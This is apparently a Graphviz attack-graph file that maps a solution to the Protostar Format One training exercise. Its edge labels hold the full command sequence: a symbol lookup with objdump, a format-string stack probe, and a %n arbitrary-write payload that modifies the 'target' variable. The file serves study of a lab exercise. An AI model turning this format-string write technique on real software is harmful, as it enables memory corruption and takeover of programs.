digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Format One"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="target address recovered"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Stack offset to attacker-controlled bytes identified"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Arbitrary write payload built"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="target modified"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -t /opt/protostar/bin/format1 | grep \" target$\""];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/format1 AAAA.%08x.%08x.%08x.%08x.%08x"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"\\x38\\x96\\x04\\x08AAAA%60x%7$n\"'"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/format1 $(python -c 'print \"\\x38\\x96\\x04\\x08AAAA%60x%7$n\"')"];
}
